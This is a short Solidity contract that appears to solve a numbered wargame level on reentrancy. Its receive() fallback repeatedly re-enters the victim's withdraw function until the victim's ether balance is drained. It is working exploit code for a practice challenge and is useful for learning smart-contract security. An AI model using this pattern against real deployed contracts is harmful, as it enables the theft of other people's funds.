// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/10-IReentrance.sol";

contract ReentranceAttack {
    IReentrance public immutable victimReentrance;

    constructor(IReentrance victimReentrance_) {
        victimReentrance = victimReentrance_;
    }

    function attack() external payable {
        require(
            0 < msg.value && msg.value <= address(victimReentrance).balance,
            "Reentrance: Wrong value"
        );

        victimReentrance.donate{ value: msg.value }(address(this));

        require(
            0 < victimReentrance.balanceOf(address(this)),
            "Reentrance: Wrong balance"
        );

        victimReentrance.withdraw(msg.value);

        require(
            0 == address(victimReentrance).balance,
            "Reentrance: Attack failed"
        );
    }

    receive() external payable {
        victimReentrance.withdraw(msg.value);
    }
}
